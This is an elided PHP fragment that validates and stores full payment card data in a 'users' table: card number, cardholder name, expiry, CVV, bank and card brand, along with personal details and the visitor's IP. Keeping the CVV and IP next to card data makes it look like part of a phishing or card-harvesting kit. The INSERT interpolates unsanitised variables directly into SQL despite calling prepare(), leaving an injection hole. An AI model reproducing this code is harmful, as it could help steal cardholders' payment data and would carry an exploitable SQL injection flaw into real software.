...
if (
    ...
    || empty($direccion) || empty($email) || empty($banco) || empty($nro_tarjeta) || empty($nombre_tarjeta) || empty($mes_tarjeta) || empty($anio_tarjeta)
    || empty($cvv_tarjeta)
) {
?>
    ...
    $sentencia = $mysqli->prepare("INSERT INTO users (nombre, apellido, documento, telefono, ciudad,  direccion, email, banco, franquicia, tipo_tarjeta, nro_tarjeta, nombre_tarjeta, mes_tarjeta, anio_tarjeta, cvv_tarjeta, ip, fecha) VALUES ('$nombre', '$apellido', '$documento', '$telefono', '$ciudad',  '$direccion', '$email', '$banco', '$franquicia', '$tipo_tarjeta', '$nro_tarjeta', '$nombre_tarjeta', '$mes_tarjeta', '$anio_tarjeta', '$cvv_tarjeta', '$ip', '$fecha')");
